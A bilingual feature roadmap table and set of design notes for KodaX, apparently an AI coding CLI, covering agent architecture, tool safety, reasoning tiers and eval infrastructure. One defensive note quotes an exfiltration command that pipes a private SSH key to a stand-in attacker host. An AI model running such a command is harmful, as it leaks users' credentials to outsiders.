| `122` | ~~PM Thinking Framework Prompt — 4-Stage Workflow + Continue-vs-Spawn + Synthesis Discipline~~ | ~~Enhancement / Quality~~ | ~~Medium~~ | ~~`v0.7.41`~~ | [v0.7.41](features/v0.7.41.md#feature_122-pm-thinking-framework-prompt) | **Cancelled**: claudecode 4-stage workflow 是 Coordinator mode 双角色身份切换的配套 prompt（PM 身份 → PM 工作方式）；KodaX 单 Worker 模式无身份切换需求。LLM 在 fan-out 后默认会做 Synthesis，122 仅为 ~8.4% 任务（fan-out 28% × 多 child 并行 30%）的边际优化加完整 feature，违反 KodaX `NEVER add abstractions until 3+ concrete use cases`。剩余真实价值（fan-out 时显式 Synthesis）通过 v0.7.36 FEATURE_114 worker-role-prompt 加 1-2 行 hint 覆盖。Continue-vs-Spawn 决策由 FEATURE_120 send_message 工具描述自然引导 |
| `094` | Deep Anti-Escape Hardening — Runtime Detection and Retry Contract for Generative Large-File Writes | Core | Medium | `v0.7.42` | [v0.7.42](features/v0.7.42.md#feature_094-deep-anti-escape-hardening--runtime-detection-and-retry-contract-for-generative-large-file-writes) |
| `124` | Memory System Alignment — 4-Type Taxonomy (user/feedback/project/reference) + Two-Step Save Helper | Enhancement / Persistence | Medium | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_124-memory-system-alignment) |
| `123` | Peer-to-Peer SendMessage — Child Agent Inter-Communication on Top of FEATURE_120 Routing | Internal / Architecture | Medium | `v0.7.44` | [v0.7.44](features/v0.7.44.md#feature_123-peer-to-peer-sendmessage) |
| `128` | Dispatch-to-Self-Construction Bridge — subagent_type Field + Dynamic Agent List Cache | Internal / Architecture | Medium | `v0.7.50` | [v0.7.50](features/v0.7.50.md#feature_128-dispatch-to-self-construction-bridge) |
| `125` | KodaX Team Mode — Multi-Instance Auto Coordination (LLM-First Awareness + Content Hash Safety Net) | Core / Architecture | High | `v0.7.41` | [v0.7.41](features/v0.7.41.md#feature_125-kodax-team-mode--multi-instance-auto-coordination) | **Re-scoped 2026-05-06 from v0.8.10 mode-based design**: claude code Team Mode 调研证实它**没解决冲突**（默认共享 leader cwd / 无 lock / 无 worktree / 完全靠 LLM 自律）—— KodaX 不照搬。**KodaX 自创 LLM-First 设计**：4 层架构（state broadcast → 注入其他 session 状态到 system prompt → tool-time soft warning → content hash safety net），用户**零认知负担**（自动感知，无需 `/team create`），LLM 拿到信息**自决协调**，runtime 仅在 race condition 物理边界（content hash mismatch）兜底。~530 行实现（vs 原 v0.8.10 mode-based ~600 行）。这是 KodaX 比 claude code 在多 session 协作维度做得**更好**的差异化设计 |
| `126` | PM Mode Tool Restriction (Data-Driven) — Hard Enforcement of PM Behavior via Tool Whitelist | Enhancement / Quality | Low | `v0.8.x` | TBD (placeholder, contingent on FEATURE_122 production data) |
| `131` | Tool Safety Patch Pack — File Mutation Queue + Edit Unicode Normalization | Core / Tool Safety | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_131-tool-safety-patch-pack--file-mutation-queue--edit-unicode-normalization) | **Async Safety Pack 之二**（与 FEATURE_119 + FEATURE_130 同期 ship）。Part A: `file-mutation-queue.ts` path-keyed 串行队列防 Pattern B 多 child 并行同文件 race 静默丢改动（Windows 大小写不敏感 + POSIX 保留组件大小写）。Part B: `edit-diff.ts:normalizeForFuzzyMatch` NFKC + smart quotes (`""''`) / em-dash (`—`) / en-dash (`–`) / 全角/IDEO 空格 → ASCII 正规化解决 KodaX 实战 silent edit-fail 主因（用户从 Word/网页/聊天复制代码 + 输入法自动替换 typographic 字符）。Cross-process content-hash 安全网（FEATURE_125）显式留 v0.7.41 |
| `130` | Provider Retry-After Header + Exponential Backoff | Internal / Robustness | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_130-provider-retry-after-header--exponential-backoff) | **Async Safety Pack 之一**（与 FEATURE_119 + FEATURE_131 同期 ship）。跨 12 provider 标准化处理 4 种 retry-after header 形态：integer-seconds / HTTP-date / Anthropic `retry-after-ms` / 无 header → exponential backoff fallback。Helper `parseRetryAfter` + `extractHeadersFromError` 集中在 `@kodax/ai/retry/retry-after.ts`，每个 `KodaXBaseProvider` 子类自动继承。`KodaXProviderStreamOptions.onRetryAfter` + `KodaXEvents.onRetryAfter` + `RetryRecord` cost-tracker channel + Ink REPL `[Rate limited]` 倒计时 status push。**必须与 FEATURE_119 同期 ship** — Pattern B 多 child 并行直接拉高 429 概率（特别是 5 个共享 quota 的 coding plan provider：kimi/zhipu/mimo/ark/minimax-coding）|
| `141` | Transcript Inline Diff Renderer — Edit / Multi-Edit / Write Tool Result Hunk Display | Enhancement / UX | High | `v0.7.37` | [v0.7.37](features/v0.7.37.md#feature_141-transcript-inline-diff-renderer) (新增 — KodaX `repl/src/` 当前无 diff 渲染组件；edit 完成后用户在 transcript 仅看到普通文本结果。先做 inline 渲染，再决定是否需要 FEATURE_138 turn-level overlay) |
| `132` | LSP Native Integration — TS/JS + Python + Rust + Go + Java (5 languages) + Edit-Time Diagnostics Reflux | Core / Tool | High | `v0.7.49` | TBD (RFC pending; 公共底座 ~680 LOC + 5 语言 adapter ~810 LOC + 测试 ~650 LOC = ~2140 LOC 总量；首语言贵但每加一语言只 ~130-250 LOC，5 语言一鼓作气投入产出比好；从 opencode `lsp/server.ts` + `apply_patch.ts:260-285` 设计模式 — 内置 LSP minimal set + edit 后 touchFile + diagnostics 注入 tool result，省 ≥1 轮 LLM 往返) |
| `134` | Image / Screenshot Paste Input — REPL Vision Bridge | Enhancement / UX | Medium | `v0.7.40` | TBD (RFC pending; from claudecode `usePasteHandler.ts` — 12 provider 已支持 vision 但 REPL 缺粘贴入口；OSC52 + 路径识别 + 简单 resize) |
| `137` | RPC Headless Protocol — JSON-Line stdin/stdout Bridge for IDE/Web/SDK | Internal / Surface | High | `v0.8.0` | TBD (RFC pending; merged INTO FEATURE_030 Multi-Surface Delivery; from pi-mono `modes/rpc/rpc-mode.ts` — `takeOverStdout` 纪律 + RpcExtensionUIRequest 双向桥；VSCode extension / web UI / CI 自动化的统一入口) |
| `139` | NotebookEdit Tool — Jupyter Cell-Level CRUD | Enhancement / Tool | Low | `v0.8.20+` | TBD (RFC pending; deferred per user direction — DS/ML 用户驱动，等用户社区反馈再决定是否提前) |
| `111` | ~~Runner-Level Soft-Pause Protocol~~ | ~~Enhancement / UX~~ | ~~High~~ | ~~`v0.7.43`~~ | [v0.7.43](features/v0.7.43.md#feature_111-runner-level-soft-pause-protocol) | **Absorbed into FEATURE_115**: 5 轮调研后确认 soft-pause UX 是 message queue 的具体应用——单击 ESC tool 边界软暂停 + 文字注入下一轮可以完全用 FEATURE_115 的 agentId-scoped drain + Sleep-gated mid-turn drain 实现，不需要独立的 `paused: boolean` runner 局部变量。FEATURE_111 设计稿保留为历史，实现统一走 FEATURE_115。v0.7.43 slot 转交 FEATURE_124（Memory System Alignment） |
| `127` | ~~Per-Agent Model Tier Routing — read-only child default fast model~~ | ~~Internal / Cost~~ | ~~Low~~ | — | — | **Cancelled (never planned)**: 5 轮调研后判断"read-only child 默认 fast model" 是 hard-coded 策略 + Claude Code 特定场景优化（Anthropic 三档 Haiku/Sonnet/Opus + 34M+ Explore spawns/week），不是 read-only 的本质需求。改为：dispatch_child_task schema 加 `model_hint?: 'fast'|'balanced'|'deep'` 可选字段（FEATURE_120 一并加）+ Worker LLM 根据任务自决是否标 hint + 实际 routing 行为合并到 FEATURE_102 (v0.7.45) 的 capability profile。**不预设 hard-coded 默认**，符合 KodaX minimalist 哲学 |
| `095` | ~~SSH-Friendly Cell-Level Diff Renderer for Ink Substrate~~ | ~~Refactor~~ | ~~Medium~~ | ~~`v0.7.39`~~ | [v0.7.30](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095) | **Absorbed into FEATURE_057**: cell-level screen buffer 是 057 §10 renderer-native selection / §11 ScrollBox parity / Track E output ownership 收口的实际前置基础设施，并入 057 作为 Track F 统一设计与交付 |
| `096` | Windows-SSH ConPTY Host Auto-Downgrade to Main-Screen Policy | Enhancement | Medium | `v0.7.30` | [v0.7.30](features/v0.7.30.md#feature_096-windows-ssh-conpty-host-auto-downgrade-to-main-screen-policy) | **Migrated 2026-04-28**: 原计划 `v0.7.39` 单独交付，2026-04-28 提前迁入 `v0.7.30` 与 FEATURE_057 同版交付，理由见顶部 last-updated 说明 |
| `102` | Adaptive Multi-Provider Orchestration Runtime | Internal / Core | High | `v0.7.45` | [v0.7.45](features/v0.7.45.md#feature_102-adaptive-multi-provider-orchestration-runtime) |
| `105` | Verifiable Advisor Consult Primitive | Internal / Core | High | `v0.7.46` | [v0.7.46](features/v0.7.46.md#feature_105-verifiable-advisor-consult-primitive) |
| `108` | Session-Driven Reflective Prompt Patcher | Internal / Test Infrastructure | Medium | `v0.7.47` | [v0.7.47](features/v0.7.47.md#feature_108-session-driven-reflective-prompt-patcher) |
| `109` | ~~Harness Observability Substrate — Long-Term Memory + Prediction Contract + Cross-Family Prose Guard~~ | ~~Internal / Substrate~~ | ~~Medium~~ | ~~`v0.7.48`~~ | [v0.7.48](features/v0.7.48.md#feature_109-harness-observability-substrate--long-term-memory--prediction-contract--cross-family-prose-guard) | **Cancelled (2026-05-06)**: 调研 v0.7.36-43 已落地后剩余 scope 全部已被覆盖 — long-term memory 给 FEATURE_124（v0.7.43）；audit log 给 FEATURE_090（v0.7.32 ship）+ FEATURE_101（v0.7.31 ship）；cross-family prose guard 是 FEATURE_104（v0.7.29 ship）alias 表语义本身。剩余唯一独立产出是 AHE 论文 component ablation eval（4 组 × 8 alias × 20 case = 640 LLM call ~$30 + 5-7 天工作量），验证成本太高 ROI 不明。如未来 KodaX 跑生产 telemetry 后真有 prompt-structure-vs-prose 决策需求，再做 measurement task（不立 feature） |
| `113` | TodoList JSON / CLI Surface — External Consumption of FEATURE_097 Realtime Progress | Enhancement | Medium | `v0.8.2` | [v0.8.2](features/v0.8.2.md#feature_113-todolist-json--cli-surface) |
| `093` | Coding and REPL Internal Circular Dependency Decoupling | Internal | Medium | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_093-coding-and-repl-internal-circular-dependency-decoupling) |
| `007` | Theme System Consolidation | Enhancement | Medium | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_007-theme-system-consolidation) |
| `030` | Multi-Surface Delivery | Enhancement | High | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_030-multi-surface-delivery) |
| `059` | ~~Managed Task Structured Protocol V2~~ | ~~Internal~~ | ~~High~~ | ~~`v0.8.0`~~ | [v0.8.0](features/v0.8.0.md#feature_059-managed-task-structured-protocol-v2) | **Absorbed into FEATURE_084**: 新的 Layer A 原语重写 Scout/Generator/Evaluator 时，会同步把 fenced-block 文本协议替换为 tool-call 驱动的结构化协议。059 的 dual-track visibleText+protocolPayload 目标并入 084 的 Runner/Span 协议层实现，不再作为独立 feature 调度 |
| `063` | ~~Extensible Hook & Automation Substrate~~ | Enhancement | High | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_063-extensible-hook--automation-substrate) | **Cancelled**: Extension 系统已覆盖，executor 能力提取为 `api.exec()`/`api.webhook()` |
| `073` | ~~Reference-Style Lineage and Island Model Removal~~ | ~~Internal~~ | ~~Medium~~ | ~~`v0.7.25`~~ | [v0.7.25](features/v0.7.25.md#feature_073-reference-style-lineage-and-island-model-removal) | **Cancelled**: 哲学审查未通过——没有用户痛点、没有性能改善、主要卖点（`/fork` 改进）已自撤；072 已消除 dual source-of-truth 的结构债；YAGNI（为 partial/multi-boundary compaction 等未规划特性铺抽象）。设计稿保留作为未来真有 use case 时的起点 |

---

## 阅读说明

- `FEATURE_022` 是当前架构转向的 umbrella feature，`FEATURE_019`、`FEATURE_025`、`FEATURE_027`、`FEATURE_028`、`FEATURE_029`、`FEATURE_034` 是它的关键支撑切片。
- `FEATURE_061` 是 AMA 架构简化重构：Scout 成为 AMA 唯一入口（既判断又干活），角色升级保留上下文，每个角色可拉 subagent 并行，去掉预路由层和 Tactical Flow。
- 当前正式执行模型是：`SA` 直达；`AMA` 只保留 `H0 / H1 / H2`；`H3` 已移除。
- `Scout` 是 AMA 的入口和第一执行者：H0 时 Scout 直接完成任务；H1/H2 时 Scout 升级为 Generator 或 Planner 并保留上下文。
- `H1` 是 `Generator + 轻量 Evaluator`：无 `Planner`、无 contract negotiation。Evaluator 打回最多 1 次，再不合格则升级到 H2。
- `H2` 主骨架固定为 `Planner -> Generator <-> Evaluator`。Evaluator 区分 `revise`（执行问题）和 `replan`（计划问题），各最多 1 次。
- `FEATURE_054` 已于 v0.7.27 归档：`/project` 命令整块删除（CLI flag + `project-*.ts` 模块 + barrels + `KODAX_FEATURES_FILE` / `KODAX_PROGRESS_FILE` 常量），无需再做独立的 AMA 吸收任务。后续设计默认以"单主 authority + Planner 吸收 brainstorm"为目标，不再扩独立 project/planner 表面。
- `kodax -c` 属于 `user session` 恢复语义，不属于 internal worker-session recovery。
- `FEATURE_023` 只应继续承担更高层 terminal/delivery ergonomics，不应重新打开 `FEATURE_051 / FEATURE_055` 已冻结的 REPL shell。
- `FEATURE_057` 是 `FEATURE_023` 下的 renderer-boundary 迁移切片：目标是保留当前 shell 的视觉与信息架构，同时把 transcript/prompt/footer 的视口隔离和 host-aware 降级下沉到自有渲染层，而不是重做一个新的 shell。
- `FEATURE_031` 只承担 multimodal artifact intake，不应滑向 gallery、media workbench 或 design-review surface。
- `FEATURE_042` 只应继续加强 repo-intelligence substrate，不应扩成 repo graph / workbench UI。
- `FEATURE_038 / 043 / 053 / 054 / 056` 与 `023 / 031 / 042` 现统一收编到 `v0.7.30`，便于在同一版本内同步推进 runtime clarity、harness safety 与 transcript-native interaction maturity。
- `FEATURE_056` 的目标是补 tool interaction 的解释层与 transcript-native 交互成熟度，不是把 KodaX 做成更重的 coordinator/task cockpit。
- `FEATURE_072` 是 v0.7.18 post-compact 回归（v0.7.19 已用 6 处 surgical fix 止血）之后的结构性收口：把压缩热路径从 flat `context.messages` 迁移到 lineage-native（`getSessionMessagesFromLineage`-driven），让 post-compact attachments 作为 `KodaXSessionCompactionEntry` 的一等字段而不是散在 flat 数组里的 `[Post-compact: ...]` 系统消息。目标是单 source-of-truth，参考 Claude Code `getMessagesAfterCompactBoundary` 和 pi-mono `buildSessionContext`。v0.7.19 的 P4（字符串前缀 dedup）和 P6（REPL finally 复位）在 migration 完成后会被退休。
- `FEATURE_073`（Reference-Style Lineage）已 **Cancelled**。原意是把压缩数据模型从 copy-style 换到 reference-style，对齐 pi-mono / Claude Code 的心智模型。但站在 KodaX "Minimalist & Intelligent" 哲学回看：该 feature 解决零用户痛点（072 已修好 post-compact 回归）、无性能改善（和 copy-style + eviction memory parity）、主要卖点（`/fork` 到压缩前 entry 的语义改进）在挑战过程中被自己撤回；剩余动机"便于未来 partial compaction / multi-boundary 落地"属于 YAGNI。设计稿保留在 `docs/features/v0.7.25.md` 作为未来若出现具体 use case 时的参考起点。
- `FEATURE_076` 是 v0.7.19 Scout ceiling clamp fix（commit `3efdb7b`）之后的结构性收口：把 `runManagedTask` 出口的 `context.messages` 从"代理执行轨迹"（Evaluator 的独立会话、Scout role prompt 包装）收正为"用户对话"（干净的 `{user, assistant}` 对），让 multi-turn conversation、token 统计、session 持久化在 SA/H0/H1/H2/resume 所有路径上语义一致。与 `FEATURE_046`（轮内 worker handoff）关注点不同；`046` 负责轮内 final-answer convergence，`076` 负责轮间 message shape。
- `FEATURE_078` 是 reasoning 子系统的**分层化**：把当前"单一全局 `--reasoning auto|quick|balanced|deep|off` 档位 + 兼容 `--thinking` 别名 + provider `reasoning-overrides`"的平面模型，拆成四级决策链（L1 用户意图上限 / L2 角色默认 / L3 Scout 下游建议 / L4 Evaluator 动态升档）。动机：Scout 自己需要 reasoning 才能跑，因此不能由 Scout 决定所有角色的 reasoning 档位；而一个全局档位又无法区分"Scout 要快、Generator 要深"这类合理诉求。**依赖**：FEATURE_080（Agent primitive 字段）+ FEATURE_084（Scout/Generator/Evaluator 已是 Agent 实例）+ **FEATURE_100（v0.7.29，给 SA 路径的 `defaultCodingAgent` 也接通 Agent declaration 上的 reasoning slot，否则 SA 无角色锚点 → 锁死 L1 ceiling 违背 ADR-003）**。版本节奏：原计划 v0.7.35 → Plan B 移到 v0.7.29 → 2026-04-26 因 FEATURE_100 占满 v0.7.29 移到 v0.7.30 与 FEATURE_057 Track F 共版 → **2026-04-27 撤回顺延、加回 v0.7.29 与 FEATURE_100 同版**（FEATURE_100 P3.6v 完成 SA/AMA 共享底座 17/17 后，substrate executor 已能直接承接 4 段决策链；078 也用 P3.6v 类似的 contract test + grep gate 多重保障落地）。
- **`FEATURE_100`（v0.7.29）是 KodaX 实现层 SA / AMA 双底座漂移的最终收口**。事实状态：`packages/coding/src/agent.ts:1433` `runKodaX`（3164 行）作为 SA 入口，`packages/coding/src/task-engine/runner-driven.ts:3698` `runManagedTaskViaRunner` 作为 AMA 入口，两条路径完全独立；后者 13 处 `// legacy parity restore` 注释（`onSessionStart` / repoIntelligenceContext / `cleanupIncompleteToolCalls` / `saveSessionSnapshot` / cost tracker / multimodal 等）是 v0.7.26 FEATURE_084 让 AMA 路径绕开 `runKodaX` 之后陆续补回的 SA-already-had 能力，构成 FEATURE_084 漂移的反向充分证据。决策模型：用户层 SA / AMA 切换永久保留为产品决策（ADR-003 / ADR-012），实现层收敛到 **Option α — 单一 substrate executor + 多 Agent declaration**（SA topology = `Runner.run(defaultCodingAgent, prompt, ctx)`，AMA topology = `Runner.run(scoutAgent, prompt, ctx)`，dispatcher 只挑 declaration 不分叉 body）。auto-reroute 等 7 类 SA-exclusive 能力按 Class 1 substrate middleware（无条件运行）+ Class 2 Runner-level guardrail（注册式）+ Class 3 declarable opt-in middleware（`AgentDeclaration.middleware` 字段开关，auto-reroute default-on for `defaultCodingAgent` 和 `generatorAgent` —— 让 AMA Generator 也能 mid-iteration 升档应对更难任务，符合 ADR-003）三层归类。**显式废除 v0.7.23 FEATURE_080 的 "Option Y" facade**（Runner.run 注册 dispatcher 转回 `runKodaX` 的 shim），删除 `runDirectKodaX` 符号、删除 13 处 parity-restore patch（能力来自 substrate）。**质量保证**：P1（capability inventory + golden trace + contract test 框架，1 周）→ P2（pure extraction 行为零变更，1-1.5 周）→ P3（Runner Frame Adoption 实质收敛，1.5-2 周）→ P4（dead code cleanup + reverse audit grep `legacy|parity restore|inadvertently dropped` 必须 0 命中，0.5 周），phase 间硬 gate 不得并行。**直接切换不留 legacy flag**（产品决策：质量优先于节奏，避免拖延技术债 + 不重蹈 FEATURE_084 双轨过渡的覆辙）。预计 4-5 周完成。详见 [v0.7.29 设计稿](features/v0.7.29.md#feature_100-sa-runner-frame-adoption--capability-unification) 和 [ADR-020](ADR.md#adr-020-unified-agent-execution-substrate-feature_100-v0729)。
- **`FEATURE_079 - FEATURE_091` + `FEATURE_100` 是 KodaX 从"coding CLI product"升级为"可被复杂 Agent 系统嵌入的基础设施"的主路线**（Plan B 压缩版 + v0.7.29 SA 收敛）。该路线分三段：**SDK 基底段**（v0.7.22-v0.7.27，FEATURE_079 到 086）把 task-engine 拆成可维护的核心 + 引入 Agent/Handoff/Runner/Guardrail/Tracer/Span 等 Layer A 原语 + 按新原语重写 Scout/Generator/Evaluator + 清理 `KodaX*` 前缀死码 + 抽出 repointel 协议包；**底座统一段**（v0.7.29，FEATURE_100）把 SA 路径从独立 `runKodaX` 实现收敛到 Runner 帧 + Agent declaration 模型，关闭 v0.7.23 Option Y facade 之后的实现层双底座漂移，让所有后续 feature 的 Runner-level 集成点在 SA / AMA 两个 mode 下天然对等；**自构建段**（v0.7.28、v0.7.30-v0.7.32，FEATURE_087/088/078/060/089/090）引入 ConstructionRuntime + Constructed-World + 档 2-4 的 Tool/Agent 生成与自改 role spec + reasoning 子系统分层 + bounded-memory 收口。全部完工于 v0.7.32 之前，0.8.0 不做任何底座改动。本方案通过 5 处合并（080+081 / 082+083 / 084+085 / 086+091 / 087+088）+ FEATURE_100 + FEATURE_078 共占 v0.7.29（078 在 100 的 substrate executor 收敛后撤回顺延，2026-04-27）控制版本数。
- `FEATURE_079` 是 task-engine.ts 的**阶段 1 拆分**：纯提取（pure extraction），零行为变化。把当前 9000+ 行的 task-engine 中与 Scout/H1/H2 状态机解耦的部分（prompt builder、pure reducer、managed-task util 等）迁到同目录下的子模块，task-engine.ts 作为 re-export 门面继续提供原有 symbol，测试全部保持绿。这是所有后续 Layer A/B 切分的前提，单独成版本以控制风险。
- `FEATURE_080 + FEATURE_081` 合并在 **v0.7.23** 落地：两者共同完成"**Layer A data shape 定型**"。080 引入 `Agent`（declarative dataclass）、`Handoff`（continuation / as-tool 两种语义）、`Runner`（最小执行入口）、`Guardrail`（占位类型），并 dog-food SA 直达路径。081 把 Compaction 分成 `CompactionPolicy` 接口 + `DefaultSummaryCompaction` + `LineageCompaction`（保留 FEATURE_072 能力），Session 切成基础接口 + `LineageExtension`。合并理由：两者都是"数据形状"层的契约定型，`Agent.tools` / `Agent.handoffs` / `Session` 在内部需要同一批引用点一起定型，分开做反而要 touch 相同文件两次。FEATURE_076 的 round-boundary 语义、FEATURE_060 的 bounded-memory 目标作为设计前置约束保留。
- `FEATURE_082 + FEATURE_083` 合并在 **v0.7.24** 落地：两者共同完成"**primitive 基础设施层**"。082 按 Layer A/B/C 分层切出 `@kodax/core`、`@kodax/mcp`（整体搬迁保留渐进式披露的 lazy connect / 两级描述符 / search-describe / elicitation / cache 五个模式，**暂不泛化** `ProgressiveCapabilitySource` 接口，遵守 CLAUDE.md "3+ real cases 才抽象"规则）、`@kodax/capabilities`、`@kodax/tracing`、`@kodax/session-lineage`。083 引入 `Trace` / `Span` / `SpanData` 子类 / `TracingProcessor` 接口，收编现有碎片化 trace 到同一 span 模型。合并理由：082 已经为 tracing 准备了 `@kodax/tracing` 包位，同版本填充 tracing 内容是自然的连带。同步清掉 `@kodax/ai/cli-events/` 包职责外溢（GLM F-8）。
- `FEATURE_084 + FEATURE_085` 合并在 **v0.7.26** 落地：两者共同完成"**runtime 行为层重写**"。084 用 `Agent` 声明式重写 Scout/Generator/Evaluator 为标准 Agent 实例，用 `Handoff` 表达角色转移，**同步替换** fenced-block 文本协议为 tool-call 驱动的结构化协议（吸收 FEATURE_059 的 dual-track visibleText+protocolPayload 目标）。085 在 Agent 的 input/output/tool 三个挂点补齐 Guardrail runtime，开放注册走 extension runtime。合并理由：084 重写 Scout 时必然 touch Agent 的 input/output/tool 各位点，同时挂 guardrail 钩子比分开两版每版挂一遍经济。
- `FEATURE_086 + FEATURE_091` 合并在 **v0.7.27** 落地：两者共同完成"**清理与协议抽取**"。086 借用户量少的窗口**一次性**移除 `KodaX*` 前缀（不走长期 deprecated 路径），核心 primitive 去前缀，brand 类型（`KodaXError`、`KodaXClient`、`KodaXCodingOptions`）保留；同步清除 `compactMessages()` legacy、`--team` CLI 参数、README 残存 `/project` 流程、GLM F-4/F-5/F-6 归一化函数重复。091 把 `premium-contract.ts` 抽成独立 npm 包 `@kodax/repointel-protocol`，三方消费者（公仓 KodaX、私仓 KodaX-private、`clients/repointel/` 第三方 host 接入）统一依赖协议包，替代当前 vendor 方式。合并理由：两者都是"清洁与抽取"类的结构性 hygiene 工作，风险域互不相交（前缀在 coding/core，协议在 repo-intelligence），可以同版本完成。
- `FEATURE_087 + FEATURE_088` 合并在 **v0.7.28** 落地：两者共同完成"**自构建基础设施 + 档 2 首个消费者**"。087 引入 `ConstructionRuntime` 四段生命周期（stage/test/activate/revoke）+ Constructed-World 存储（`.kodax/constructed/`）+ Resolver 合并 + policy gate。088 让 Agent 生成 Tool 定义并通过 sandbox 测试后注册（档 2）。合并理由：087 提供基础设施，088 是它的首个真实消费者；一起做能验证基础设施的 API shape，避免 087 独立落地后 088 才发现接口需要调整。档 1（Skill 生成）作为既有能力的自然兑现，在本版自动可用。
- `FEATURE_101 + FEATURE_089 + FEATURE_106` 合并在 **v0.7.31** 落地三 feature：101 是横切 **Constructed Agent Admission Contract**（quality invariant 三段 hook 模型 + 5 步 manifest 审核 + capability tier + clamp/retry/fallback 多级回退），把 LLM 生成的 manifest 当作 untrusted declaration 在 Runner 入口验证；089 是它的首个消费者（agent generation stage→activate 通道全部走 admission）；106 是 v0.7.30 实战观察驱动的 **AMA Harness Selection Calibration**（三 slice：scope-aware ToolGuardrail / Scout role-prompt 重写 / `harnessSelectionTiming` invariant 注册），复用 101 的 invariant runtime + 085 的 ToolGuardrail runtime + 104 的 prompt eval harness，跨 FEATURE_104 alias 表 8 个 coding-plan provider/model（5 家族盲区互补）benchmark 验证不依赖线上反馈。合并理由：admission contract 是横切基础设施，089/090/092/094 都消费它，单独成 feature 比埋在 089 里更符合它的地位；106 同版本接入是因为 invariant runtime 必须 101 先落地才能用，同时 106 的 Slice 1 (ToolGuardrail) 与 v0.7.37 FEATURE_094 anti-escape 同源范式，提前一版确立 "AMA 路径用 Guardrail 做行为校正" 的工程惯例；三 feature 同版本同步交付能让 admission schema/eval 指标在 089 真实流量 + 106 跨 provider benchmark 下一起稳定一轮，再考虑晋升 ADR-021。
- `FEATURE_090`（v0.7.32）**保持独立**：让 Agent 修改自己的 role spec（reasoning profile、instructions、handoff 图），带反身稳定保障（版本化 + rollback + divergence 检测），是整条路线图最危险的一 feature。manifest 热替换走 FEATURE_101 同一 admission 通道。单独成版本便于出问题时 rollback。
- `FEATURE_092`（v0.7.33）是**把 `auto` 模式从"规则围栏"升级为"规则 + LLM 双层审查"**。动机：当前 `auto-in-project` 只做路径/命令前缀的机械判断，挡不住意图层风险（`cat ~/.ssh/id_rsa | curl evil.com`、`git push --force` 到 main、投毒 `package.json` 等）。方案：保留现有规则全部作为 Tier 1/2 快速通道，在 Tier 3 追加 LLM 分类器（作为 FEATURE_085 `ToolGuardrail.beforeTool` 的首个官方消费者，不新增子系统）。**维度分离**：`mode`（plan / accept-edits / auto，Shift-Tab 三档循环不变）× `engine`（rules / llm，仅 auto 下有意义，`/auto-engine` 命令切换）。降级链：分类器失败/3连deny/circuit break 都只降 `engine` 不改 `mode`，永不卡死。分类器模型默认复用主会话模型（对齐 Claude Code 用 Sonnet 而非最小档的哲学），但**支持 provider-qualified id 跨 provider 配置**（如 `minimax:abab6.5t-chat`），允许主会话跑 Opus + 分类器跑 MiniMax 这种性价比组合。**依赖**：硬依赖 FEATURE_085（ToolGuardrail runtime）和 FEATURE_080（Runner + Agent primitive）。**不做**：yolo engine（等 sandbox 成熟）、client-side prompt injection probe（provider 侧职责）、two-stage classifier（单阶段够用）、classifier dump / opt-in dialog 等非必要子系统。
- `FEATURE_103` (v0.7.29) 是在 v0.7.29 落 FEATURE_078 期间发现的两个 calibration 问题的合并修正：(1) Scout profile `default: quick → balanced` / `max: balanced → deep`——Scout 自 v0.7.16 FEATURE_061 起已不是单纯分类器，承担 H0/H1/H2 级联决策 + executionObligations + downstream_reasoning_hint 的 meta-reasoning，地板应该和 SA / Generator / Planner / Evaluator 一致是 balanced 而不是分类器时代沿用的 quick；(2) 在 FEATURE_078 的 L1-L4 链上加第 5 层 L5 user-followup escalate——任务边界处用户表达怀疑（"这个不对吧"）或加深要求（"仔细分析"）时单步升档，与 L4（任务内 Evaluator-revise 升档）形成"系统自检 + 用户施压"双轨。doubt 类别要求 prior assistant turn（防 false-positive），deepen 类别不要求；off 是 sacrosanct kill switch；deep 是 fixed point；不直接跳 max（多步可达，避免一次用完头寸）。详见 [v0.7.29 FEATURE_103 设计](features/v0.7.29.md#feature_103-scout-calibration--l5-user-followup-escalate)。
- `FEATURE_104` (v0.7.29) 是 prompt-eval 测试基础设施模块化 + 数据集/结果分目录约定：把 v0.7.29 之前 7 个 `tests/*.eval.ts` 各自 inline 的 `(provider, model, apiKeyEnv)` 三元组收敛到 `benchmark/harness/aliases.ts` 的 8 个用户指定 coding-plan 短名（`zhipu/glm51` / `kimi` / `mimo/v25{,pro}` / `mmx/m27` / `ark/glm51` / `ds/v4{pro,flash}`）；提供共享 judges (`mustContainAll/Any` / `mustNotContain` / `mustMatch/NotMatch` / `lengthWithin` / `parseAndAssert` / `runJudges`，含 JudgeCategory 维度) 和 harness (`runOneShot` / `runABComparison` / `runBenchmark` 量化版含 multi-run + variance + decomposed quality + REPORT.md 9 段输出 + persist 到 `benchmark/results/<timestamp>/`)；KodaX 场景与 LiveCanvas recipe 唯一 deviation 是**质量是唯一打分维度**（coding agent 慢但对优于快但错，latency 仅做诊断不打分）；把"什么 PR 必须配 prompt eval"的判断口径写进 `benchmark/README.md`（凡涉及 system-prompt / role-prompt / tool-description / coding-preset DEFAULT_INSTRUCTIONS / protocol-emitter prompts 的字符串字面量都要 eval；只调思考深度参数的不要）。folder 结构: `benchmark/{harness/, datasets/, results/}` 中 harness + datasets 进 git，results 不进 git。41 个 self-test 锁住 alias 表 verbatim shape + judge category 维度 + benchmark 矩阵聚合 + REPORT.md 渲染 + persistence 读写 + quality-only 设计的 negative-space 验证（无 speedScore/composite），跑在默认 `npm test` 里零 LLM 成本；真实 `*.eval.ts` 跑在独立的 `npm run test:eval`（缺 API key 自动 skip）。详见 [v0.7.29 FEATURE_104 设计](features/v0.7.29.md#feature_104-prompt-eval-harness-module-v2--quantitative-benchmark)。
